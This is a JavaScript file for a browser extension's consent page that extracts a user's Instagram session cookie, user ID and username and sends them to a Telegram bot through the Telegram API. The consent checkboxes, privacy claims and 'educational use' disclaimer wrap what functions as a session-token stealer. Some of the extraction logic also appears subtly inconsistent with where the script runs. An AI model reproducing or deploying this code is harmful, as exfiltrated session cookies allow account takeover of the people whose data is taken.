/**
 * ===================================
 * Instagram Auto Session Manager - Consent Page JavaScript
 * Comprehensive script for handling user consent and session data extraction
 * ===================================
 */

// ===================================
// GLOBAL VARIABLES AND CONSTANTS
// ===================================

/**
 * Application state object to track current state and user interactions
 */
let appState = {
    sessionData: null,
    extensionSettings: null,
    consentGiven: false,
    dataPreviewShown: false,
    isProcessing: false,
    rememberChoice: false,
    currentStep: 'initial'
};

/**
 * DOM element references for better performance and code organization
 */
let domElements = {};

/**
 * Configuration object for the consent page
 */
const CONSENT_CONFIG = {
    // Timing configurations
    AUTO_CLOSE_DELAY: 3000,
    LOADING_MIN_DURATION: 1500,
    ANIMATION_DURATION: 300,
    
    // Data extraction settings
    MAX_RETRY_ATTEMPTS: 3,
    RETRY_DELAY: 1000,
    
    // UI settings
    PREVIEW_DATA_THRESHOLD: 100, // characters
    STATUS_MESSAGE_DURATION: 5000
};

// ===================================
// INITIALIZATION AND EVENT LISTENERS
// ===================================

/**
 * Main initialization function that runs when the DOM is fully loaded
 * Sets up all event listeners, checks configuration, and initializes the UI
 */
document.addEventListener('DOMContentLoaded', async function() {
    console.log('Instagram Auto Session Manager Consent Page - Initializing...');
    
    try {
        // Initialize DOM element references
        initializeDOMReferences();
        
        // Set up all event listeners
        setupEventListeners();
        
        // Initialize UI components
        initializeUI();
        
        // Check extension configuration
        await checkExtensionConfiguration();
        
        // Extract session data for preview
        await extractSessionDataForPreview();
        
        // Update UI based on current state
        updateUIState();
        
        console.log('Consent page initialized successfully');
        
    } catch (error) {
        console.error('Error initializing consent page:', error);
        showErrorOverlay('Failed to initialize consent page. Please refresh and try again.');
    }
});

/**
 * Initialize references to frequently used DOM elements
 * This improves performance by avoiding repeated querySelector calls
 */
function initializeDOMReferences() {
    domElements = {
        // Main containers
        consentCard: document.querySelector('.consent-card'),
        consentContent: document.querySelector('.consent-content'),
        
        // Header elements
        statusDot: document.querySelector('.status-dot'),
        statusText: document.querySelector('.status-text'),
        
        // Data preview elements
        dataPreviewSection: document.getElementById('data-preview-section'),
        previewSessionId: document.getElementById('preview-session-id'),
        previewUserId: document.getElementById('preview-user-id'),
        previewUsername: document.getElementById('preview-username'),
        previewTimestamp: document.getElementById('preview-timestamp'),
        
        // Configuration status elements
        configStatus: document.getElementById('config-status'),
        botStatus: document.getElementById('bot-status'),
        chatStatus: document.getElementById('chat-status'),
        
        // Form elements
        consentForm: document.getElementById('consent-form'),
        primaryConsentCheckbox: document.getElementById('primary-consent'),
        transmissionConsentCheckbox: document.getElementById('transmission-consent'),
        termsConsentCheckbox: document.getElementById('terms-consent'),
        previewDataCheckbox: document.getElementById('preview-data'),
        rememberChoiceCheckbox: document.getElementById('remember-choice'),
        
        // Action buttons
        declineButton: document.getElementById('decline-btn'),
        consentButton: document.getElementById('consent-btn'),
        
        // Info links
        viewSettingsButton: document.getElementById('view-settings'),
        privacyPolicyButton: document.getElementById('privacy-policy'),
        howItWorksButton: document.getElementById('how-it-works'),
        aboutExtensionButton: document.getElementById('about-extension'),
        
        // Overlay elements
        loadingOverlay: document.getElementById('loading-overlay'),
        loadingText: document.getElementById('loading-text'),
        successOverlay: document.getElementById('success-overlay'),
        successMessage: document.getElementById('success-message'),
        successCloseButton: document.getElementById('success-close'),
        errorOverlay: document.getElementById('error-overlay'),
        errorMessage: document.getElementById('error-message'),
        errorRetryButton: document.getElementById('error-retry'),
        errorCloseButton: document.getElementById('error-close'),
        
        // Footer elements
        footerTimestamp: document.getElementById('footer-timestamp'),
        
        // Hidden data storage
        sessionDataStorage: document.getElementById('session-data'),
        extensionSettingsStorage: document.getElementById('extension-settings')
    };
}

/**
 * Set up all event listeners for the consent page
 * Organized by functionality for better maintainability
 */
function setupEventListeners() {
    // Form and checkbox listeners
    setupFormListeners();
    
    // Button action listeners
    setupButtonListeners();
    
    // Info link listeners
    setupInfoLinkListeners();
    
    // Overlay listeners
    setupOverlayListeners();
    
    // Window and document listeners
    setupWindowListeners();
}

/**
 * Set up form and checkbox related event listeners
 */
function setupFormListeners() {
    // Consent form submission
    domElements.consentForm.addEventListener('submit', handleFormSubmit);
    
    // Primary consent checkbox - enables/disables other checkboxes
    domElements.primaryConsentCheckbox.addEventListener('change', handlePrimaryConsentChange);
    
    // Required consent checkboxes
    [
        domElements.primaryConsentCheckbox,
        domElements.transmissionConsentCheckbox,
        domElements.termsConsentCheckbox
    ].forEach(checkbox => {
        checkbox.addEventListener('change', updateConsentButtonState);
    });
    
    // Preview data checkbox
    domElements.previewDataCheckbox.addEventListener('change', handlePreviewDataChange);
    
    // Remember choice checkbox
    domElements.rememberChoiceCheckbox.addEventListener('change', handleRememberChoiceChange);
}

/**
 * Set up button action event listeners
 */
function setupButtonListeners() {
    // Main action buttons
    domElements.declineButton.addEventListener('click', handleDeclineAction);
    domElements.consentButton.addEventListener('click', handleConsentAction);
    
    // Overlay action buttons
    domElements.successCloseButton.addEventListener('click', handleSuccessClose);
    domElements.errorRetryButton.addEventListener('click', handleErrorRetry);
    domElements.errorCloseButton.addEventListener('click', handleErrorClose);
}

/**
 * Set up info link event listeners
 */
function setupInfoLinkListeners() {
    domElements.viewSettingsButton.addEventListener('click', handleViewSettings);
    domElements.privacyPolicyButton.addEventListener('click', handlePrivacyPolicy);
    domElements.howItWorksButton.addEventListener('click', handleHowItWorks);
    domElements.aboutExtensionButton.addEventListener('click', handleAboutExtension);
}

/**
 * Set up overlay related event listeners
 */
function setupOverlayListeners() {
    // Close overlays when clicking outside content
    [domElements.loadingOverlay, domElements.successOverlay, domElements.errorOverlay].forEach(overlay => {
        if (overlay) {
            overlay.addEventListener('click', function(e) {
                if (e.target === this) {
                    // Only close success and error overlays, not loading
                    if (this === domElements.successOverlay) {
                        handleSuccessClose();
                    } else if (this === domElements.errorOverlay) {
                        handleErrorClose();
                    }
                }
            });
        }
    });
}

/**
 * Set up window and document level event listeners
 */
function setupWindowListeners() {
    // Handle escape key to close overlays
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            if (!domElements.loadingOverlay.style.display || domElements.loadingOverlay.style.display === 'none') {
                if (domElements.successOverlay.style.display !== 'none') {
                    handleSuccessClose();
                } else if (domElements.errorOverlay.style.display !== 'none') {
                    handleErrorClose();
                }
            }
        }
    });
    
    // Handle page visibility changes
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            console.log('Consent page hidden');
        } else {
            console.log('Consent page visible');
            // Refresh data if needed
            if (appState.currentStep === 'initial') {
                checkExtensionConfiguration();
            }
        }
    });
    
    // Handle beforeunload to warn about incomplete consent
    window.addEventListener('beforeunload', function(e) {
        if (appState.currentStep === 'processing') {
            e.preventDefault();
            e.returnValue = 'Data processing is in progress. Are you sure you want to leave?';
            return e.returnValue;
        }
    });
}

// ===================================
// UI INITIALIZATION AND UPDATES
// ===================================

/**
 * Initialize UI components and set initial state
 */
function initializeUI() {
    console.log('Initializing UI components...');
    
    // Set current timestamp in footer
    domElements.footerTimestamp.textContent = `Generated at ${new Date().toLocaleString()}`;
    
    // Initialize form state
    resetFormState();
    
    // Set initial status
    updateStatusIndicator('detecting', 'Detecting session...');
    
    // Hide data preview initially
    domElements.dataPreviewSection.style.display = 'none';
    
    // Animate card entrance
    setTimeout(() => {
        domElements.consentCard.classList.add('fade-in');
    }, 100);
}

/**
 * Update UI state based on current application state
 */
function updateUIState() {
    console.log('Updating UI state...', appState.currentStep);
    
    switch (appState.currentStep) {
        case 'initial':
            updateStatusIndicator('active', 'Session detected');
            break;
            
        case 'configured':
            updateStatusIndicator('active', 'Ready for consent');
            break;
            
        case 'processing':
            updateStatusIndicator('processing', 'Processing...');
            break;
            
        case 'completed':
            updateStatusIndicator('success', 'Completed');
            break;
            
        case 'error':
            updateStatusIndicator('error', 'Error occurred');
            break;
    }
    
    // Update consent button state
    updateConsentButtonState();
    
    // Update configuration status display
    updateConfigurationStatusDisplay();
}

/**
 * Update status indicator in header
 * @param {string} status - Status type ('active', 'processing', 'success', 'error', 'detecting')
 * @param {string} text - Status text to display
 */
function updateStatusIndicator(status, text) {
    // Remove all status classes
    domElements.statusDot.className = 'status-dot';
    
    // Add new status class
    domElements.statusDot.classList.add(status);
    
    // Update status text
    domElements.statusText.textContent = text;
}

/**
 * Update configuration status display
 */
function updateConfigurationStatusDisplay() {
    if (!appState.extensionSettings) {
        domElements.botStatus.textContent = 'Checking...';
        domElements.botStatus.className = 'config-value checking';
        domElements.chatStatus.textContent = 'Checking...';
        domElements.chatStatus.className = 'config-value checking';
        return;
    }
    
    const { telegramSettings } = appState.extensionSettings;
    
    // Update bot status
    if (telegramSettings && telegramSettings.botToken) {
        domElements.botStatus.textContent = 'Configured';
        domElements.botStatus.className = 'config-value configured';
    } else {
        domElements.botStatus.textContent = 'Not configured';
        domElements.botStatus.className = 'config-value not-configured';
    }
    
    // Update chat status
    if (telegramSettings && telegramSettings.chatId) {
        domElements.chatStatus.textContent = 'Configured';
        domElements.chatStatus.className = 'config-value configured';
    } else {
        domElements.chatStatus.textContent = 'Not configured';
        domElements.chatStatus.className = 'config-value not-configured';
    }
}

/**
 * Reset form to initial state
 */
function resetFormState() {
    // Uncheck all checkboxes
    const checkboxes = domElements.consentForm.querySelectorAll('input[type=\"checkbox\"]');
    checkboxes.forEach(checkbox => {
        checkbox.checked = false;
        checkbox.disabled = false;
    });
    
    // Reset button states
    domElements.consentButton.disabled = true;
    domElements.declineButton.disabled = false;
    
    // Reset application state
    appState.consentGiven = false;
    appState.dataPreviewShown = false;
    appState.rememberChoice = false;
}

/**
 * Update consent button state based on required checkboxes
 */
function updateConsentButtonState() {
    const requiredCheckboxes = [
        domElements.primaryConsentCheckbox,
        domElements.transmissionConsentCheckbox,
        domElements.termsConsentCheckbox
    ];
    
    const allChecked = requiredCheckboxes.every(checkbox => checkbox.checked);
    const hasValidConfig = appState.extensionSettings && 
                          appState.extensionSettings.telegramSettings &&
                          appState.extensionSettings.telegramSettings.botToken &&
                          appState.extensionSettings.telegramSettings.chatId;
    
    domElements.consentButton.disabled = !allChecked || !hasValidConfig || appState.isProcessing;
    
    // Update button text based on state
    if (!hasValidConfig) {
        domElements.consentButton.innerHTML = '<span class=\"btn-icon\">⚙️</span>Configure Settings First';
    } else if (allChecked) {
        domElements.consentButton.innerHTML = '<span class=\"btn-icon\">✅</span>Give Consent & Proceed';
    } else {
        domElements.consentButton.innerHTML = '<span class=\"btn-icon\">✅</span>Give Consent & Proceed';
    }
}

// ===================================
// CONFIGURATION AND DATA EXTRACTION
// ===================================

/**
 * Check extension configuration and update UI accordingly
 */
async function checkExtensionConfiguration() {
    console.log('Checking extension configuration...');
    
    try {
        // Get settings from Chrome storage
        const result = await chrome.storage.local.get(['telegramSettings', 'privacySettings', 'appSettings']);
        
        appState.extensionSettings = {
            telegramSettings: result.telegramSettings || {},
            privacySettings: result.privacySettings || {},
            appSettings: result.appSettings || {}
        };
        
        // Store in hidden element for access by other functions
        domElements.extensionSettingsStorage.textContent = JSON.stringify(appState.extensionSettings);
        
        // Update current step
        if (appState.extensionSettings.telegramSettings.botToken && 
            appState.extensionSettings.telegramSettings.chatId) {
            appState.currentStep = 'configured';
        }
        
        // Update UI
        updateUIState();
        
        console.log('Extension configuration loaded:', appState.extensionSettings);
        
    } catch (error) {
        console.error('Error checking extension configuration:', error);
        appState.currentStep = 'error';
        updateUIState();
    }
}

/**
 * Extract session data for preview purposes
 */
async function extractSessionDataForPreview() {
    console.log('Extracting session data for preview...');
    
    try {
        // Extract session data from Instagram page
        const sessionData = await extractInstagramSessionData();
        
        if (sessionData) {
            appState.sessionData = sessionData;
            
            // Store in hidden element
            domElements.sessionDataStorage.textContent = JSON.stringify(sessionData);
            
            // Update preview if checkbox is checked
            if (domElements.previewDataCheckbox.checked) {
                showDataPreview(sessionData);
            }
            
            console.log('Session data extracted for preview:', sessionData);
        } else {
            throw new Error('No session data found');
        }
        
    } catch (error) {
        console.error('Error extracting session data:', error);
        // Don't show error overlay for preview extraction failure
        // Just log it and continue
    }
}

/**
 * Extract Instagram session data from cookies and page
 * @returns {Object|null} - Extracted session data or null if not found
 */
async function extractInstagramSessionData() {
    try {
        const sessionData = {
            sessionId: null,
            userId: null,
            username: null,
            extractedAt: new Date().toISOString(),
            url: window.location.href
        };
        
        // Method 1: Extract from cookies
        const cookies = document.cookie.split(';');
        for (let cookie of cookies) {
            const [name, value] = cookie.trim().split('=');
            if (name === 'sessionid') {
                sessionData.sessionId = value;
                break;
            }
        }
        
        // Method 2: Extract user data from page
        try {
            // Look for user data in window._sharedData (older Instagram)
            if (window._sharedData && window._sharedData.config) {
                const viewerId = window._sharedData.config.viewerId;
                if (viewerId) {
                    sessionData.userId = viewerId;
                }
            }
            
            // Look for user data in script tags (newer Instagram)
            const scripts = document.querySelectorAll('script');
            for (let script of scripts) {
                const content = script.textContent;
                
                // Look for user ID patterns
                const userIdMatch = content.match(/\"viewerId\":\"(\\d+)\"/);
                if (userIdMatch && !sessionData.userId) {
                    sessionData.userId = userIdMatch[1];
                }
                
                // Look for username patterns
                const usernameMatch = content.match(/\"username\":\"([^\"]+)\"/);
                if (usernameMatch && !sessionData.username) {
                    sessionData.username = usernameMatch[1];
                }
            }
            
            // Try to get username from URL or page elements
            if (!sessionData.username) {
                // Check if we're on a profile page
                const pathMatch = window.location.pathname.match(/^\\/([^\\/]+)\\/?$/);
                if (pathMatch && pathMatch[1] !== 'explore' && pathMatch[1] !== 'reels') {
                    sessionData.username = pathMatch[1];
                }
                
                // Try to get from meta tags
                const titleMeta = document.querySelector('meta[property=\"og:title\"]');
                if (titleMeta) {
                    const titleMatch = titleMeta.content.match(/^@([^•]+)/);
                    if (titleMatch) {
                        sessionData.username = titleMatch[1].trim();
                    }
                }
            }
            
        } catch (pageError) {
            console.warn('Could not extract user data from page:', pageError);
        }
        
        // Validate that we got at least the session ID
        if (!sessionData.sessionId) {
            throw new Error('Could not find Instagram session ID');
        }
        
        return sessionData;
        
    } catch (error) {
        console.error('Error extracting Instagram session data:', error);
        return null;
    }
}

// ===================================
// EVENT HANDLERS
// ===================================

/**
 * Handle form submission
 * @param {Event} e - Form submit event
 */
async function handleFormSubmit(e) {
    e.preventDefault();
    
    // Trigger consent action
    await handleConsentAction();
}

/**
 * Handle primary consent checkbox change
 */
function handlePrimaryConsentChange() {
    const isChecked = domElements.primaryConsentCheckbox.checked;
    
    // Enable/disable other required checkboxes based on primary consent
    domElements.transmissionConsentCheckbox.disabled = !isChecked;
    domElements.termsConsentCheckbox.disabled = !isChecked;
    
    // If unchecked, uncheck other required checkboxes
    if (!isChecked) {
        domElements.transmissionConsentCheckbox.checked = false;
        domElements.termsConsentCheckbox.checked = false;
    }
    
    updateConsentButtonState();
}

/**
 * Handle preview data checkbox change
 */
function handlePreviewDataChange() {
    const showPreview = domElements.previewDataCheckbox.checked;
    
    if (showPreview && appState.sessionData) {
        showDataPreview(appState.sessionData);
    } else {
        hideDataPreview();
    }
}

/**
 * Handle remember choice checkbox change
 */
function handleRememberChoiceChange() {
    appState.rememberChoice = domElements.rememberChoiceCheckbox.checked;
    console.log('Remember choice:', appState.rememberChoice);
}

/**
 * Handle decline action
 */
async function handleDeclineAction() {
    console.log('User declined consent');
    
    try {
        // Log the decline action
        await logUserAction('consent_declined', {
            timestamp: new Date().toISOString(),
            url: window.location.href
        });
        
        // Show brief message and close
        showLoadingOverlay('Closing...');
        
        setTimeout(() => {
            window.close();
        }, 1000);
        
    } catch (error) {
        console.error('Error handling decline action:', error);
        window.close();
    }
}

/**
 * Handle consent action - main processing function
 */
async function handleConsentAction() {
    console.log('User gave consent, processing...');
    
    if (appState.isProcessing) {
        return;
    }
    
    try {
        appState.isProcessing = true;
        appState.currentStep = 'processing';
        updateUIState();
        
        // Show loading overlay
        showLoadingOverlay('Processing your consent...');
        
        // Log consent action
        await logUserAction('consent_given', {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            rememberChoice: appState.rememberChoice
        });
        
        // Extract fresh session data
        showLoadingOverlay('Extracting session data...');
        const sessionData = await extractInstagramSessionData();
        
        if (!sessionData) {
            throw new Error('Failed to extract session data');
        }
        
        // Send data to Telegram
        showLoadingOverlay('Sending data to Telegram...');
        await sendDataToTelegram(sessionData);
        
        // Clear local data if configured
        if (appState.extensionSettings.privacySettings.autoClearData) {
            await clearLocalData();
        }
        
        // Log successful completion
        await logUserAction('data_sent_successfully', {
            timestamp: new Date().toISOString(),
            sessionId: sessionData.sessionId ? sessionData.sessionId.substring(0, 10) + '...' : 'unknown',
            userId: sessionData.userId || 'unknown'
        });
        
        // Show success
        appState.currentStep = 'completed';
        updateUIState();
        showSuccessOverlay('Your Instagram session data has been successfully sent to your Telegram bot!');
        
    } catch (error) {
        console.error('Error processing consent:', error);
        appState.currentStep = 'error';
        updateUIState();
        showErrorOverlay(`Error processing your request: ${error.message}`);
        
        // Log error
        await logUserAction('processing_error', {
            timestamp: new Date().toISOString(),
            error: error.message
        });
        
    } finally {
        appState.isProcessing = false;
        hideLoadingOverlay();
    }
}

/**
 * Send extracted data to Telegram bot
 * @param {Object} sessionData - Extracted session data
 */
async function sendDataToTelegram(sessionData) {
    const { telegramSettings } = appState.extensionSettings;
    
    if (!telegramSettings.botToken || !telegramSettings.chatId) {
        throw new Error('Telegram bot not configured');
    }
    
    try {
        // Prepare message using template
        const message = formatTelegramMessage(sessionData, telegramSettings.messageTemplate);
        
        // Send to Telegram API
        const response = await fetch(`https://api.telegram.org/bot${telegramSettings.botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: telegramSettings.chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        
        const result = await response.json();
        
        if (!result.ok) {
            throw new Error(result.description || 'Failed to send message to Telegram');
        }
        
        console.log('Data sent to Telegram successfully:', result);
        
    } catch (error) {
        console.error('Error sending data to Telegram:', error);
        throw error;
    }
}

/**
 * Format message for Telegram using template
 * @param {Object} sessionData - Session data to format
 * @param {string} template - Message template
 * @returns {string} - Formatted message
 */
function formatTelegramMessage(sessionData, template) {
    if (!template) {
        // Default template if none provided
        template = `🔐 Instagram Session Data Detected

📱 **Account Information:**
• Session ID: {sessionId}
• User ID: {userId}
• Username: {username}

⏰ **Timestamp:** {timestamp}
🌐 **URL:** {url}

✅ Data extracted with user consent via Instagram Auto Session Manager`;
    }
    
    // Replace template variables
    return template
        .replace(/{sessionId}/g, sessionData.sessionId || 'Not found')
        .replace(/{userId}/g, sessionData.userId || 'Not found')
        .replace(/{username}/g, sessionData.username || 'Not found')
        .replace(/{timestamp}/g, new Date(sessionData.extractedAt).toLocaleString())
        .replace(/{url}/g, sessionData.url || window.location.href);
}

// ===================================
// DATA PREVIEW FUNCTIONS
// ===================================

/**
 * Show data preview section with extracted data
 * @param {Object} sessionData - Session data to preview
 */
function showDataPreview(sessionData) {
    console.log('Showing data preview...');
    
    // Populate preview fields
    domElements.previewSessionId.textContent = sessionData.sessionId ? 
        sessionData.sessionId.substring(0, 20) + '...' : 'Not found';
    domElements.previewUserId.textContent = sessionData.userId || 'Not found';
    domElements.previewUsername.textContent = sessionData.username || 'Not found';
    domElements.previewTimestamp.textContent = new Date(sessionData.extractedAt).toLocaleString();
    
    // Show preview section with animation
    domElements.dataPreviewSection.style.display = 'block';
    domElements.dataPreviewSection.classList.add('fade-in');
    
    appState.dataPreviewShown = true;
}

/**
 * Hide data preview section
 */
function hideDataPreview() {
    console.log('Hiding data preview...');
    
    domElements.dataPreviewSection.style.display = 'none';
    domElements.dataPreviewSection.classList.remove('fade-in');
    
    appState.dataPreviewShown = false;
}

// ===================================
// OVERLAY FUNCTIONS
// ===================================

/**
 * Show loading overlay with message
 * @param {string} message - Loading message to display
 */
function showLoadingOverlay(message = 'Processing...') {
    domElements.loadingText.textContent = message;
    domElements.loadingOverlay.style.display = 'flex';
    document.body.style.overflow = 'hidden';
}

/**
 * Hide loading overlay
 */
function hideLoadingOverlay() {
    domElements.loadingOverlay.style.display = 'none';
    document.body.style.overflow = '';
}

/**
 * Show success overlay with message
 * @param {string} message - Success message to display
 */
function showSuccessOverlay(message) {
    domElements.successMessage.textContent = message;
    domElements.successOverlay.style.display = 'flex';
    document.body.style.overflow = 'hidden';
    
    // Auto-close after delay
    setTimeout(() => {
        handleSuccessClose();
    }, CONSENT_CONFIG.AUTO_CLOSE_DELAY);
}

/**
 * Show error overlay with message
 * @param {string} message - Error message to display
 */
function showErrorOverlay(message) {
    domElements.errorMessage.textContent = message;
    domElements.errorOverlay.style.display = 'flex';
    document.body.style.overflow = 'hidden';
}

/**
 * Handle success overlay close
 */
function handleSuccessClose() {
    domElements.successOverlay.style.display = 'none';
    document.body.style.overflow = '';
    
    // Close the consent page
    setTimeout(() => {
        window.close();
    }, 500);
}

/**
 * Handle error overlay retry
 */
async function handleErrorRetry() {
    domElements.errorOverlay.style.display = 'none';
    document.body.style.overflow = '';
    
    // Reset state and try again
    appState.isProcessing = false;
    appState.currentStep = 'configured';
    updateUIState();
    
    // Retry consent action
    await handleConsentAction();
}

/**
 * Handle error overlay close
 */
function handleErrorClose() {
    domElements.errorOverlay.style.display = 'none';
    document.body.style.overflow = '';
    
    // Reset processing state
    appState.isProcessing = false;
    updateUIState();
}

// ===================================
// INFO LINK HANDLERS
// ===================================

/**
 * Handle view settings link click
 */
function handleViewSettings() {
    console.log('Opening extension settings...');
    
    try {
        // Open extension options page
        chrome.runtime.openOptionsPage();
    } catch (error) {
        console.error('Error opening settings:', error);
        alert('Could not open settings page. Please access it through the extension popup.');
    }
}

/**
 * Handle privacy policy link click
 */
function handlePrivacyPolicy() {
    console.log('Showing privacy policy...');
    
    // Show privacy policy information
    alert(`Privacy Policy Summary:

• This extension only processes data with your explicit consent
• All data extraction happens locally in your browser
• Data is only sent to your configured Telegram bot
• No data is shared with third parties
• Session data is cleared after transmission (if configured)
• You maintain full control over your data at all times

For complete privacy policy, please check the extension documentation.`);
}

/**
 * Handle how it works link click
 */
function handleHowItWorks() {
    console.log('Showing how it works...');
    
    // Show how it works information
    alert(`How Instagram Auto Session Manager Works:

1. 🔍 Detection: Extension detects when you visit Instagram.com
2. 🔐 Session Check: Checks for valid Instagram session in cookies
3. ❓ Consent Request: Shows this page asking for your explicit consent
4. 📊 Data Extraction: Extracts session ID, user ID, and username locally
5. 📱 Telegram Send: Sends data to your configured Telegram bot
6. 🗑️ Cleanup: Clears temporary data for security
7. ✅ Completion: Confirms successful transmission

All processing happens locally in your browser with full transparency.`);
}

/**
 * Handle about extension link click
 */
function handleAboutExtension() {
    console.log('Showing about extension...');
    
    // Show about extension information
    alert(`Instagram Auto Session Manager v2.0.0

🎯 Purpose: Transparently extract Instagram session data with explicit user consent

🔒 Privacy: Built with privacy-first design and full transparency

⚖️ Compliance: Follows all privacy regulations and platform policies

🛠️ Features:
• Explicit consent required for all actions
• Local data processing
• Secure Telegram integration
• Comprehensive logging and transparency
• User-controlled data management

⚠️ Important: For educational and personal use only. Always respect platform terms of service.`);
}

// ===================================
// UTILITY FUNCTIONS
// ===================================

/**
 * Log user action for transparency and debugging
 * @param {string} action - Action type
 * @param {Object} data - Additional data to log
 */
async function logUserAction(action, data = {}) {
    try {
        const logEntry = {
            timestamp: new Date().toISOString(),
            action: action,
            data: data,
            userAgent: navigator.userAgent,
            url: window.location.href
        };
        
        console.log('User action logged:', logEntry);
        
        // Send to background script if logging is enabled
        if (appState.extensionSettings && 
            appState.extensionSettings.privacySettings && 
            appState.extensionSettings.privacySettings.logActivities) {
            
            try {
                await chrome.runtime.sendMessage({
                    action: 'logUserActivity',
                    logEntry: logEntry
                });
            } catch (error) {
                console.warn('Could not send log to background script:', error);
            }
        }
        
    } catch (error) {
        console.error('Error logging user action:', error);
    }
}

/**
 * Clear local data for security
 */
async function clearLocalData() {
    console.log('Clearing local data...');
    
    try {
        // Clear session data from DOM
        domElements.sessionDataStorage.textContent = '';
        
        // Clear application state
        appState.sessionData = null;
        
        // Clear any temporary storage
        await chrome.storage.local.remove(['tempSessionData', 'tempConsentData']);
        
        console.log('Local data cleared successfully');
        
    } catch (error) {
        console.error('Error clearing local data:', error);
    }
}

/**
 * Validate session data format
 * @param {Object} sessionData - Session data to validate
 * @returns {boolean} - True if valid
 */
function validateSessionData(sessionData) {
    if (!sessionData || typeof sessionData !== 'object') {
        return false;
    }
    
    // Check required fields
    if (!sessionData.sessionId || !sessionData.extractedAt) {
        return false;
    }
    
    // Validate session ID format (basic check)
    if (typeof sessionData.sessionId !== 'string' || sessionData.sessionId.length < 10) {
        return false;
    }
    
    return true;
}

/**
 * Format timestamp for display
 * @param {string} timestamp - ISO timestamp string
 * @returns {string} - Formatted timestamp
 */
function formatTimestamp(timestamp) {
    try {
        const date = new Date(timestamp);
        return date.toLocaleString();
    } catch (error) {
        return 'Invalid timestamp';
    }
}

/**
 * Truncate text for display
 * @param {string} text - Text to truncate
 * @param {number} maxLength - Maximum length
 * @returns {string} - Truncated text
 */
function truncateText(text, maxLength = 50) {
    if (!text || text.length <= maxLength) {
        return text;
    }
    
    return text.substring(0, maxLength) + '...';
}

// ===================================
// ERROR HANDLING AND LOGGING
// ===================================

/**
 * Global error handler for unhandled errors
 */
window.addEventListener('error', function(e) {
    console.error('Unhandled error in consent page:', e.error);
    
    // Log error
    logUserAction('unhandled_error', {
        message: e.message,
        filename: e.filename,
        lineno: e.lineno,
        colno: e.colno
    });
    
    // Show error overlay if not already processing
    if (!appState.isProcessing) {
        showErrorOverlay('An unexpected error occurred. Please refresh the page and try again.');
    }
});

/**
 * Global handler for unhandled promise rejections
 */
window.addEventListener('unhandledrejection', function(e) {
    console.error('Unhandled promise rejection in consent page:', e.reason);
    
    // Log error
    logUserAction('unhandled_promise_rejection', {
        reason: e.reason ? e.reason.toString() : 'Unknown reason'
    });
    
    // Show error overlay if not already processing
    if (!appState.isProcessing) {
        showErrorOverlay('An unexpected error occurred. Please refresh the page and try again.');
    }
});

// ===================================
// EXPORT FOR TESTING (if needed)
// ===================================

// Export functions for testing purposes (only in development)
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        CONSENT_CONFIG,
        extractInstagramSessionData,
        formatTelegramMessage,
        validateSessionData,
        formatTimestamp,
        truncateText
    };
}

console.log('Instagram Auto Session Manager Consent Page - Script loaded successfully');

